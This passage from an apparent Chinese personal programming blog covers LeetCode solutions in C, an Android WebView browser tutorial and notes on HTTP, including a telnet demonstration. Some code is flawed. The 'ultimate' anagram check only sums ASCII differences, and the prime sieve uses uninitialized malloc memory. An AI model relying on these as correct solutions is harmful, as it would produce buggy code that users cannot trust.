AC的代码123456789101112131415161718192021int digitSquareSum(int n) &#123; //得到该数字所有数位的平方和 int sum = 0, tmp; while (n) &#123; tmp = n % 10; sum += tmp * tmp; n /= 10; &#125; return sum;&#125;bool isHappy(int n) &#123; int slow, fast; slow = fast = n; //都从n开始 do &#123; slow = digitSquareSum(slow); //前进一步，即计算一次 fast = digitSquareSum(fast); //前进两步，即计算两次 fast = digitSquareSum(fast); &#125; while(slow != fast); //直到两者相等 if (slow == 1) return 1; //判断最终结果是否为1 else return 0;&#125; 这个问题的关键是如何结束一个潜在的无限循环，下面给出别人的更高效的方法，确实很不错。上面说到：所有不快乐数的数位平方和计算，最后都会进入4 → 16 → 37 → 58 → 89 → 145 → 42 → 20 → 4的周期性循环。因此，一旦出现2或4，那就可以判断为非快乐数但是下面带给出的是小于5，等与1时肯定是快乐数，2和4肯定不是快乐数，但是3还不确定，不明白作者为什么这么写。 12345678910111213141516171819202122public class Solution &#123; public boolean isHappy(int n) &#123; if ( n &lt; 5) &#123; //结束的条件 if (1 == n) return true; else return false; &#125; int sum = 0; // 得到各个位的数的平方和 while ( n &gt;= 10) &#123; sum += (n % 10) * (n % 10); n = n / 10; &#125; sum += n * n; return isHappy(sum); //递归调用 &#125;&#125; Remove ElementLeetCode第27题 题目描述Given an array and a value, remove all instances of that value in place and return the new length. Do not allocate extra space for another array, you must do this in place with constant memory. The order of elements can be changed. It doesn’t matter what you leave beyond the new length. 思路分析删除数组中的指定元素，可以从头到尾遍历数组，判断是否等于目标数，如果不等于，则将其移到数组的前面。 例如： 数组nums为[1,2,2,3,2,4]，要删除的数为2 i=0，nums[0]不等于2，则有nums[0] = nums[0]; 数组为[1,2,2,3,2,4]，len=1 i=1，nums[1]等于2，继续下一次循环 i=2，nums[2]等于2，继续下一次循环 i=3，nums[3]不等于2，则有nums[1] = nums[3]; 数组为[1,3,2,3,2,4]，len=2 i=4，nums[4]等于2，继续下一次循环 i=5，nums[5]不等于2，则有nums[2] = nums[5]; 数组为[1,3,4,3,2,4]，len=3 返回len即可，数组的前len个数即为删除指定元素剩余的数组元素。 LeetCode AC的代码1234567891011int removeElement(int* nums, int numsSize, int val) &#123; int len = 0,i; for(i=0;i&lt;numsSize;i++)&#123; //遍历数组 if(nums[i] != val) //如果不等于目标数 &#123; nums[len] = nums[i]; //依次移到数组前端 len++; //记录不等于目标数的个数 &#125; &#125; return len;&#125; Delete Node in a Linked ListLeetCode第237题 题目描述Write a function to delete a node (except the tail) in a singly linked list, given only access to that node. Supposed the linked list is 1 -&gt; 2 -&gt; 3 -&gt; 4 and you are given the third node with value 3, the linked list should become 1 -&gt; 2 -&gt; 4 after calling your function. Subscribe to see which companies asked this question 思路分析要删除链表中指定的节点，可以用一个指针指向要删除结点的下一个结点，然后将指针指向的结点的数据域和指针域复制给要删除的结点，再释放掉指针指向的结点，这样就从链表中成功删除了该结点。 LeetCode AC的代码12345678910111213/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * struct ListNode *next; * &#125;; */void deleteNode(struct ListNode* node) &#123; struct ListNode* p = node-&gt;next; //指向要删除结点的下一个结点 node-&gt;val = p-&gt;val; //把下一个结点的数据域复制给要删除的结点 node-&gt;next = p-&gt;next; //把下一个结点的指针域复制给要删除的结点 free(p); //释放下一个结点&#125; Count PrimesLeetCode第204题 题目描述Description: Count the number of prime numbers less than a non-negative number, n. 思路分析素数是指除了1和它本身以外,不能被任何整数整除的数。这是一个很老但是很经典的问题，大一的时候就遇到过这个问题，那时候只要求做出来并不没有时间复杂度等要求，但是这个题目不一样。题目要求统计小于n的数中素数的个数，方法多种，但是如果使用最原始的方法一般都会超时的，所以需要一个高效的办法来解决这个问题。 （1）基本思路（提交时超时）： 123456789101112int countPrimes(int n) &#123; int i,j,cnt=0; for(i=2;i&lt;n;i++)&#123; for(j=2;j&lt;=sqrt(i);j++)&#123; //和比它的平方根小的数相除 if(i%j==0) //如果除尽了是合数 break; &#125; if(j&gt;sqrt(i)) //如果都不能除尽则是素数 cnt++; &#125; return cnt;&#125; （2）利用数学规律解题 素数出现规律：当n≧5时，如果n为素数，那么n mod 6 = 1 或 n mod 6 = 5，即n一定出现在6x（x≥1）两侧。 可以参考这篇博客：高效判断素数方法 LeetCode AC的代码(1)12345678910111213141516171819202122bool isPrime(int num) &#123; int i; if(num == 2 || num == 3) return true; if (num % 6 != 1 &amp;&amp; num % 6 != 5) return false; for (i=5;i*i&lt;=num;i+=6) &#123; if(num%i == 0 || num%(i+2) == 0) return false; &#125; return true; &#125;int countPrimes(int n) &#123; int i,j,cnt=0; for(i=2;i&lt;n;i++)&#123; if(isPrime(i)) cnt++; &#125; return cnt;&#125; （3）改进方法 定义一个n个数大小的数组，并全部初始化为0,从2开始判断，如果这个数为0，则将他的倍数都标记为1，比如将2的倍数4，6，8…等都标记为1，然后3的倍数6，9，12…都标记为1，最后统计遍历这些数的过程中为等于0的次数。 LeetCode AC的代码(2)12345678910111213int countPrimes(int n) &#123; int i,j,cnt=0; int *prime; prime = (int *)malloc(sizeof(int)*n); //分配内存空间 for(i=2;i&lt;n;i++)&#123; //遍历小于n的数 if(prime[i] == 0)&#123; //如果这个数为0 cnt++; //记录加1 for(j=2;i*j&lt;n;j++) //将这个数的倍数都标记为1 prime[i*j] = 1; &#125; &#125; return cnt;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android WebView详解]]></title>
    <url>%2F2016%2F08%2F26%2FAndroid-WebView%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Android提供了内置的浏览器，该浏览器使用了开源的WebKit引擎，要使用内置的浏览器就需要通过WebView来实现。Android WebView在Android平台上是一个特殊的View， 它能用来显示网页，这个类可以被用来在你的app中仅仅显示一张在线的网页，还可以用来开发浏览器。本文详细介绍了WebView的相关方法以及配置操作，最后通过一个简易的浏览器对WebView进行应用演示。 基本使用基本方法 方法 描述 loadUrl(String url) 用于加载指定url对应得网页 goBack() 执行后退操作，相当于浏览器的回退按钮功能 goForward() 执行前进操作，相当于浏览器的前进按钮功能 stopLoading() 用于停止加载当前页面 reload() 用于刷新当前页面 使用示例访问百度首页： 12mWebView = (WebView) findViewById(R.id.webView1);mWebView.loadUrl(&quot;http://www.baidu.com/&quot;); 这个时候发现一个问题，启动应用后，自动的打开了系统内置的浏览器，解决这个问题需要为webview设置WebViewClient，并重写重写WebViewClient的shouldOverrideUrlLoading方法返回true，这样新的连接就会在当前WebView中打开。 1234567mWebView.setWebViewClient(new WebViewClient()&#123; @Override public boolean shouldOverrideUrlLoading(WebView view, String url)&#123; view.loadUrl(url); return true; &#125;&#125;); 进阶使用WebSettings常用方法获取设置WebView的WebSettings对象。 1mWebView.getSettings() //得到WebSettings对象 （1）设置支持自动加载图片 1mWebView.getSettings().setLoadsImagesAutomatically(true); （2）设置支持放大和缩小的功能 12mWebView.getSettings().setSupportZoom(true); mWebView..getSettings().setBuiltInZoomControls(true) （3）设置支持多窗口 1mWebView.getSettings().supportMultipleWindows(); （4） 设置支持JavaScript 1mWebView.getSettings().setJavaScriptEnabled(true); （5）设置将图片调整到适合webview的大小 1mWebView.getSettings().setUseWideViewPort(false); （6）设置支持插件 1mWebView.getSettings().setPluginsEnabled(true); WebViewClient常用方法设置将接收各种通知和请求的WebViewClient。 123mWebView.setWebViewClient(new WebViewClient()&#123; //可在此重写下列方法，以实现相应需求&#125;); （1）开始载入页面时调用 1onPageStarted(WebView view, String url, Bitmap favicon) （2）在页面加载结束时调用 1onPageFinished(WebView view, String url) （3）在加载页面资源时调用 1onLoadResource(WebView view, String url) （4）报告错误信息1onReceivedError(WebView view, int errorCode, String description, String failingUrl) （5）重写此方法才能够处理在浏览器中的按键事件 1shouldOverrideKeyEvent(WebView view, KeyEvent event) （6）控制新的连接在当前WebView中打开 1shouldOverrideUrlLoading(WebView view, String url) WebChromeClient常用方法设置chrome处理。 123mWebView.setWebChromeClient(new WebChromeClient() &#123; //可在此重写下列方法，以实现相应需求&#125;); （1）网页加载进度改变时调用 1onProgressChanged(WebView view, int newProgress) （2）网页加载完毕时获取网站标题 1onReceivedTitle(WebView view, String title) （3）创建WebView时 1onCreateWindow(WebView view, boolean isDialog,boolean isUserGesture, Message resultMsg) （4）关闭WebView时 1onCloseWindow(WebView window) （5）网页加载完毕时获取网站图标 1onReceivedIcon(WebView view, Bitmap icon) （6）WebView获得焦点时 1onRequestFocus(WebView view) 浏览器开发小技巧（1）设置android WebView 不显示滚动条 可以直接在layout中添加如下属性设置 1android:scrollbars=&quot;none&quot; （2）一些清除方法 1234mWebView.clearHistory(); //清除当前webview访问的历史记录mWebView.clearFormData(); //清除自动完成填充的表单数据mWebView.clearCache(); //清除网页访问留下的缓存mWebView.clearMatches(); //清除网页查找的高亮匹配字符 自制简易浏览器带前进、后退、主页、刷新按钮，网页加载进度条，网址输入框的简单浏览器。 实现效果如下： 添加网络访问权限1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt; MainActivity.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113public class MainActivity extends Activity implements OnClickListener &#123; private WebView mWebView; private ImageButton mBack, mHome, mNext, mRefresh; private EditText mEditText; private ProgressBar mProgressBar; private String homeUrl = &quot;www.baidu.com&quot;; @SuppressLint(&quot;SetJavaScriptEnabled&quot;) @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); requestWindowFeature(Window.FEATURE_NO_TITLE); setContentView(R.layout.activity_main); mWebView = (WebView) findViewById(R.id.wb_test_web); mBack = (ImageButton) findViewById(R.id.ib_back); //返回按钮 mHome = (ImageButton) findViewById(R.id.ib_home); //主页按钮 mNext = (ImageButton) findViewById(R.id.ib_next); //前进按钮 mRefresh = (ImageButton) findViewById(R.id.ib_refresh); //刷新按钮 mEditText = (EditText) findViewById(R.id.et_url); //网址输入框 mProgressBar = (ProgressBar) findViewById(R.id.pb_load); //网页加载进度条 /*设置监听事件*/ mBack.setOnClickListener(this); mHome.setOnClickListener(this); mNext.setOnClickListener(this); mRefresh.setOnClickListener(this); mEditText.setOnClickListener(this); /*WebView的基本设置*/ mWebView.getSettings().setJavaScriptEnabled(true); mWebView.getSettings().setSupportZoom(true); mWebView.getSettings().setBuiltInZoomControls(true); mWebView.setInitialScale(25); mWebView.getSettings().setUseWideViewPort(true); mWebView.setWebViewClient(new WebViewClient()); mWebView.setWebChromeClient(new WebChromeClient() &#123; @Override public void onProgressChanged(WebView view, int newProgress) &#123; // TODO Auto-generated method stub mProgressBar.setProgress(newProgress); //设置进度 System.out.println(newProgress); if (newProgress == 100) &#123; mProgressBar.setVisibility(View.GONE); //加载完后设置进度条不可见 &#125;else&#123; mProgressBar.setVisibility(View.VISIBLE); //设置进度条可见 &#125; super.onProgressChanged(view, newProgress); &#125; @Override public void onReceivedTitle(WebView view, String title) &#123; // TODO Auto-generated method stub mEditText.setText(title); //网站加载完后， super.onReceivedTitle(view, title); &#125; &#125;); /*加载主页*/ loadWeb(homeUrl); mEditText.setOnKeyListener(new OnKeyListener() &#123; @Override public boolean onKey(View v, int keyCode, KeyEvent event) &#123; // TODO Auto-generated method stub String url = mEditText.getText().toString(); if (keyCode == KeyEvent.KEYCODE_ENTER) &#123; if (!url.equals(&quot;&quot;)) &#123; loadWeb(url); return true; &#125; &#125; else &#123; Toast.makeText(MainActivity.this, &quot;请输入要访问的网址&quot;, Toast.LENGTH_SHORT).show(); &#125; return false; &#125; &#125;); &#125; public void loadWeb(String url) &#123; url = &quot;http://&quot; + url; //补全url mWebView.loadUrl(url); //加载页面 &#125; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub switch (v.getId()) &#123; case R.id.ib_back: mWebView.goBack(); //返回上一个页面 break; case R.id.ib_home: loadWeb(homeUrl); //回到主页 break; case R.id.ib_next: mWebView.goForward(); //前进到下一个页面 break; case R.id.ib_refresh: mWebView.reload(); //重新加载 break; case R.id.et_url: mEditText.setText(&quot;&quot;); //输入网站 mEditText.setHint(&quot;请输入网址&quot;); break; default: break; &#125; &#125;&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Webview］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android网络编程：HTTP协议]]></title>
    <url>%2F2016%2F08%2F22%2FAndroid%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[HTTP协议是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。在之前的博客中多次使用HTTP网络请求，了解HTTP协议的详细工作过程以及报文格式，对于深入理解Android网络编程具有重要的意义。此篇博文通过搜集网络上优秀的博客文章，对HTTP协议的内容进行了较为详细的总结。 HTTP协议（HyperText Transfer Protocol，超文本传输协议）是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。 HTTP工作流程HTTP协议永远都是客户端发起请求，服务器回送响应。见下图： 这样就限制了使用HTTP协议，无法实现在客户端没有发起请求的时候，服务器将消息推送给客户端。 HTTP协议是一个无状态的协议，同一个客户端的这次请求和上次请求是没有对应关系。 一次HTTP操作称为一个事务，其工作过程可分为四步： （1）首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作开始。 （2）建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。 （3）服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。 （4）客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。 如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端，有显示屏输出。对于用户来说，这些过程是由HTTP自己完成的，用户只要用鼠标点击，等待信息显示就可以了。 HTTP URL的格式1http://host[&quot;:&quot;port][abs_path] http表示通过HTTP协议来定位网络资源 host表示合法的Internet主机域名或者ip地址 port指定一个端口号，为空则使用默认端口80 abs_path指请求资源的URL HTTP请求报文HTTP请求由四部分组成，分别是：请求行、请求报头、空行、请求数据 请求行请求行格式： 1方法 请求的URL 版本 回车换行 HTTP请求方法： HTTP请求方法有8种，分别是GET、POST、PUT、DELETE、HEAD、OPTIONS、TRACE、CONNECT 。 GET：GET的本质就是发送一个请求来取得服务器上的某一资源。资源通过一组HTTP头和呈现数据（如HTML文本，或者图片或者视频等）返回给客户端。 POST：向服务器提交数据。这个方法用途广泛，几乎目前所有的提交操作都是靠这个完成。 PUT：本质上来讲， PUT和POST极为相似，都是向服务器发送数据，但它们之间有一个重要区别，PUT通常指定了资源的存放位置，而POST则没有，POST的数据存放位置由服务器自己决定。 DELETE：请求服务器删除请求的URI所标识的资源。 HEAD：HEAD和GET本质是一样的，区别在于HEAD不含有呈现数据，而仅仅是HTTP头信息。有的人可能觉得这个方法没什么用，其实不是这样的。想象一个业务情景：欲判断某个资源是否存在，我们通常使用GET，但这里用HEAD则意义更加明确。 OPTIONS：它可以用来获取服务器支持的HTTP请求方法，还可以用来用来检查服务器的性能。它对于服务端和用户端一定是安全的。 TRACE 请求服务器回送收到的请求信息，主要用于测试或诊断 CONNECT 保留将来使用 请求报头在请求行之后会有0个或者多个请求报头，每个请求报头都由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔。 请求报头通知服务器关于客户端求求的信息，典型的请求头有： Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机 User-Agent：发送请求的浏览器类型、操作系统等信息 Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息 Accept-Encoding：客户端可识别的数据编码 Accept-Language：表示浏览器所支持的语言类型 Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如设置为Keep-Alive则表示保持连接。 Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。 空行最后一个请求头之后是一个空行，发送回车符和换行符，通知服务器以下不再有请求头。 请求数据请求数据不在GET方法中使用，而是在POST方法中使用。POST方法适用于需要客户填写表单的场合，与请求数据相关的最常用的请求头是Content-Type和Content-Length。 HTTP响应报文HTTP响应也由四部分组成，分别是：状态行、响应报头、空行、响应数据 状态行状态行格式： 1版本 状态码 原因短语 回车换行 HTTP协议响应状态码： HTTP协议响应状态码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值： 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 3xx：重定向–要完成请求必须进行更进一步的操作 4xx：客户端错误–请求有语法错误或请求无法实现 5xx：服务器端错误–服务器未能实现合法的请求 常见状态代码、状态描述、说明： 200 OK 客户端请求成功 304 NOT MODIFIED 未修改；一般浏览器会缓存一些数据，当下次请求时将发送Etag与Last_Modified信息给服务器确定是否次文件在服务器修改过，若果是将重新加载 400 Bad Request 客户端请求有语法错误，不能被服务器所理解 401 Unauthorized 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden 服务器收到请求，但是拒绝提供服务 404 Not Found 请求资源不存在，eg：输入了错误的URL 500 Internal Server Error 服务器发生不可预期的错误 503 Server Unavailable 服务器当前不能处理客户端的请求，一段时间后可能恢复正常 响应报头用于服务器传递自身信息的响应，常见的响应报头： Location：用于重定向接受者到一个新的位置，常用在更换域名的时候Server：包含可服务器用来处理请求的系统信息，与User-Agent请求报头是相对应的 响应数据服务器根据发送的请求返回的数据 HTTP报头HTTP报头分为通用报头，请求报头，响应报头和实体报头。 请求方的http报头结构：通用报头|请求报头|实体报头 响应方的http报头结构：通用报头|响应报头|实体报头 请求报头与响应报头在前文已经详细描述，下文主要讲解通用报头和实体报头。 通用报头既可以出现在请求报头，也可以出现在响应报头中 Date：表示消息产生的日期和时间 Connection：允许发送指定连接的选项，例如指定连接是连续的，或者指定“close”选项，通知服务器，在响应完成后，关闭连接 Cache-Control：用于指定缓存指令，缓存指令是单向的（响应中出现的缓存指令在请求中未必会出现），且是独立的（一个消息的缓存指令不会影响另一个消息处理的缓存机制） 实体报头实体报头用来定于被传送资源的信息，既可以用于请求也可用于响应。请求和响应消息都可以传送一个实体，常见的实体报头为： Content-Type：发送给接收者的实体正文的媒体类型 Content-Lenght：实体正文的长度 Content-Language：描述资源所用的自然语言，没有设置则该选项则认为实体内容将提供给所有的语言阅读 Content-Encoding：实体报头被用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容的编码，因而要获得Content-Type报头域中所引用的媒体类型，必须采用相应的解码机制。 Last-Modified：实体报头用于指示资源的最后修改日期和时间 Expires：实体报头给出响应过期的日期和时间 请求示例Windows下使用cmd的telnet命令模拟HTTP请求 打开命令提示符输入以下内容，建立连接1telnet blog.line-coding.tech 80 HTTP默认使用80端口，HTTPS默认使用443.此示例是对我的博客的一个404页面发送一个GET请求，所以请求地址为blog.line-coding.tech。 输入上面的命令回车之后就会进入命令界面，可以输入请求信息，也可以通过使用快捷键”Ctrl+](右中括号)”来打开本地回显功能查看自己输入的内容，在本地回显界面再按下回车就可以进入命令界面编辑请求信息。 输入请求头信息1234567GET / HTTP/1.1HOST:blog.line-coding.techUser-Agent:Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36Accept:*/*Accept-Encoding:gzip, deflate, sdchAccept-Language:zh-CNConnection:keep-alive 按两下回车键得到响应信息第一个回车代表请求头结束的空行，第二个回车代表请求数据为空并发送请求 结果如下： 红色箭头指示为我们输入的请求头，蓝色箭头指示的为响应报文的内容，下面还有一些内容就是响应数据。 参考文章： 1、《网络协议》HTTP 协议：http://blog.csdn.net/chenhanzhun/article/details/43149557 2、http协议学习系列：http://www.blogjava.net/zjusuyong/articles/304788.html 3、通过win7中cmd命令提示符telnet模拟http请求：http://blog.csdn.net/hsd2012/article/details/51075811]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,网络,Http］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(六)]]></title>
    <url>%2F2016%2F08%2F21%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%85%AD%2F</url>
    <content type="text"><![CDATA[Valid AnagramLeetCode第242题 题目描述Given two strings s and t, write a function to determine if t is an anagram of s. For example,s = “anagram”, t = “nagaram”, return true.s = “rat”, t = “car”, return false. Note:You may assume the string contains only lowercase alphabets. 思路分析先将两个字符串按字母大小排序，再从头开始比较每一个字符，如果全相等则是，否则不是。这个方法可以得到结果，但是效率太低，字符串很长时会造成超时。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define true 1#define false 0char* sort(char *s,int len) //简单选择排序&#123; int i,j,min,temp; for(i=0;i&lt;len-1;i++) &#123; min = i; for(j=i+1;j&lt;len;j++) &#123; if(s[j]&lt;s[min]) min = j; &#125; if(min!=i) &#123; temp = s[i]; s[i] = s[min]; s[min] = temp; &#125; &#125; return s;&#125;int isAnagram(char* s, char* t) &#123; //判断字符串是否相等 int len1,len2,i; len1 = strlen(s); len2 = strlen(t); if(len1 == len2) &#123; s = sort(s,len1); t = sort(t,len2); for(i=0;i&lt;len1;i++) //从第一个字符开始按顺序判断每个字符是否相等 &#123; if(s[i] == t[i]) continue; else return false; &#125; if(i==len1) //如果全相等，则返回真 return true; &#125; else return false;&#125;int main()&#123; char s[100],t[100]; gets(s); //输入两个字符串 gets(t); if(isAnagram(s,t)) printf(&quot;YES!\n&quot;); else printf(&quot;NO!\n&quot;); return 0;&#125; 更好的解法26个字母，用一个数组来记录每个字母出现的次数，如果某个字母在第一个数组出现，它第二个数组中出现时则计数减一，最好判断计数数组是否全为0。 1234567891011121314151617181920212223242526bool isAnagram(char* s, char* t) &#123; int scnt = 0; int tcnt = 0; int i; int histogram[26] = &#123;0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0&#125;; //初始化记录数组 while(s[scnt] != &apos;\0&apos;)&#123; histogram[s[scnt] - 97]++; //对应记录值加一 scnt++; &#125; while(t[tcnt] != &apos;\0&apos;)&#123; histogram[t[tcnt] - 97]--; //对应记录值减一 tcnt++; &#125; if(scnt != tcnt) return false; else if(scnt == 0) return true; else&#123; for(i = 0; i &lt; 26 ; i++) if(histogram[i] != 0) return false; //判断所有记录值是不是都为0 return true; &#125;&#125; 终极解决办法从两个字符串第一个字符开始，依次记录两个字符串的对应字符的ASCLL码的差值，如果最后得到的记录值为0，则说明两个字符串中含有的字符完全相同，否则不相同。 12345678910111213141516bool isAnagram(char* s, char* t) &#123; int total = 0; if(strlen(s)!=strlen(t)) //如果字符串长度不相等则无须比较 return false;//按顺序遍历两个字符串，用total来记录两个字符串中字符的ascll码值差值，如果最后差值等与0，则可判断为字符相等，否则不想等。 while((*s)!=&apos;\0&apos;) &#123; total += (*s-*t); s++; t++; &#125; if(total==0) return true; else return false;&#125; 超简洁的python实现1return sorted(s) == sorted(t) Add DigitsLeetCode第258题 题目描述Given a non-negative integer num, repeatedly add all its digits until the result has only one digit. For example: Given num = 38, the process is like: 3 + 8 = 11, 1 + 1 = 2. Since 2 has only one digit, return it. Follow up: Could you do it without any loop/recursion in O(1) runtime? //这个要求好像没达到，但是还是AC了 思路分析对取余得到数的各个位的数值，然后加起来，得到一个新的数，判断这个新的数是否还可以进行上述步骤，即判断该数是否大于10，如果大于10则递归执行上述操作，否则该数即为我们需要的结果。 LeetCode AC的代码1234567891011int addDigits(int num) &#123; int sum=0; while(num)&#123; //求各个位的值的和 sum = sum + num%10; num = num/10; &#125; if(sum&gt;=10) return addDigits(sum); //递归执行 else return sum;&#125; Two SumLeetCode第1题 题目描述Given an array of integers, return indices of the two numbers such that they add up to a specific target. You may assume that each input would have exactly one solution. Example: Given nums = [2, 7, 11, 15], target = 9, Because nums[0] + nums[1] = 2 + 7 = 9,return [0, 1]. 思路分析给了一个数组，然后给一个目标数，找出目标数是由数组中哪两个数相加得到的，输出那两个数的下标。我们只要从第一个数开始将每个数与后面的数依次相加并判断相加的结果是否等于目标数 一定要注意代码编辑部分的提示，返回的数组必须自己使用malloc分配内存，否则即使你做对了也一直无法AC，这就是我的惨痛教训！ LeetCode AC的代码1234567891011121314151617181920/** * Note: The returned array must be malloced, assume caller calls free(). */int* twoSum(int* nums, int numsSize, int target) &#123; int i,j,*res; res = (int *)malloc(sizeof(int)*2); for(i=0;i&lt;numsSize-1;i++) //从第一个数开始将每个数与后面的数依次相加 &#123; for(j=i+1;j&lt;numsSize;j++) &#123; if(nums[i] + nums[j] == target) //判断相加的结果是否等于目标数 &#123; res[0] = i; res[1] = j; return res; &#125; &#125; &#125; return res;&#125; Palindrome NumberLeetCode第9题 题目描述Determine whether an integer is a palindrome. Do this without extra space. 思路分析“回文”是指正读反读都能读通的句子，在数学中也有这样一类数字有这样的特征，成为回文数（palindrome number） 判断一个数是不是回文数，只要回文数是否与其倒置后的数相等 例如： 123倒置后为321，不是回文数 12344321倒置后仍为12344321，即为回文数 LeetCode AC的代码1234567891011121314151617bool isPalindrome(int x) &#123; int mod,inverse=0,num; if(x&lt;0) //负数必定不是回文数 return false; num = x; while(num) //把数倒置 &#123; mod = num%10; inverse = inverse*10 + mod; num = num/10; &#125; if(inverse==x) //判断原数与倒置后的数是否相等 return true; else return false; return true;&#125; Excel Sheet Column TitleLeetCode第168题 题目描述Given a positive integer, return its corresponding column title as appear in an Excel sheet. For example: 12345671 -&gt; A2 -&gt; B3 -&gt; C...26 -&gt; Z27 -&gt; AA28 -&gt; AB LeetCode AC的代码1234567891011121314151617181920212223char* convertToTitle(int n) &#123; int i=0,j; char *s,temp; s = (char *)malloc(sizeof(char)*100); while(n) &#123; s[i] = (char)((n-1)%26+65); n = (n-1)/26; i++; &#125; s[i]=&apos;\0&apos;; if(i&gt;1)&#123; for(j=0;j&lt;i/2;j++) &#123; temp = s[j]; s[j] = s[i-1-j]; s[i-1-j] = temp; &#125; &#125; return s;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(五)]]></title>
    <url>%2F2016%2F08%2F18%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%BA%94%2F</url>
    <content type="text"><![CDATA[Move ZeroesLeetCode第283题 题目描述Given an array nums, write a function to move all 0’s to the end of it while maintaining the relative order of the non-zero elements. For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0]. Note: 1、You must do this in-place without making a copy of the array. 2、Minimize the total number of operations. 思路分析题目要求把数组中的0移到数组后面去，主要是需要考虑全0、前面几个连续的0、已经是只有后面有0的情况，一开始抓着0来做，后来发现找非0的数会更方便一点，将非0的数依次前移，然后将后面的空位全部补0就可以完成任务了。 LeetCode AC的代码123456789101112void moveZeroes(int* nums, int numsSize) &#123; int i,j,m=0; for(i=0;i&lt;numsSize;i++) &#123; if(nums[i] != 0) nums[m++] = nums[i]; //将不为0的数前移 &#125; for(j=m;j&lt;numsSize;j++) //将后面空出的位置补0 &#123; nums[j] = 0; &#125;&#125; Problem A. 众数北邮2014年研究生复试机试题 题目描述给定一个长度为N的非降数列，求数列中出现次数最多的数。如果答案不唯一，输出其中最小的数。 输入格式 输入数据第一行是一个整数T(1&lt;=T&lt;=100)，表示测试数据的组数。注意各组测试数据是相互独立的。 对于每组测试数据： 第一行是一个正整数N（1&lt;=N&lt;=100），表示数列长度。 第二行有N个正整数，整数之间用空格隔开，所有的整数都不超过10的5次方 ，表示这个数列。 输出格式 对于每组测试数据，输出一个整数。 输入样例 2 4 1 1 1 2 5 1 1 2 2 3 输出样例 1 1 思路分析对输入序列进行排序，然后从头开始统计相同整数的个数，将个数最多的整数输出即可。 C语言实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char* sort(int *s,int len)&#123; //简单选择排序 int i,j,min,temp; for(i=0;i&lt;len-1;i++) &#123; min = i; for(j=i+1;j&lt;len;j++) &#123; if(s[j]&lt;s[min]) min = j; &#125; if(min!=i) &#123; temp = s[i]; s[i] = s[min]; s[min] = temp; &#125; &#125; return s;&#125;int main()&#123; int n,m,i,j,*num,count,k,result; scanf(&quot;%d&quot;,&amp;n); while(n--)&#123; scanf(&quot;%d&quot;,&amp;m); num = (int *)malloc(sizeof(int)*m); for(i=0;i&lt;m;i++) scanf(&quot;%d&quot;,&amp;num[i]); num = sort(num,m); //对输入序列进行排序 count=0; k=1; for(i=0;i&lt;m-1;i++) &#123; if(num[i] == num[i+1])&#123; k++; //如果连续的数相等，则计数加1 &#125;else&#123; k=1; //如果连续的数不相等，则计数清空 &#125; if(count&lt;k) //如果此时的统计个数大于之前的记录值则当前为最大值 &#123; count = k; //统计个数最多的数 result = num[i]; //记录个数最多的数的值 &#125; &#125; printf(&quot;%d\n&quot;,result); &#125; return 0;&#125; Ugly NumberLeetCode第263题 题目分析Write a program to check whether a given number is an ugly number. Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 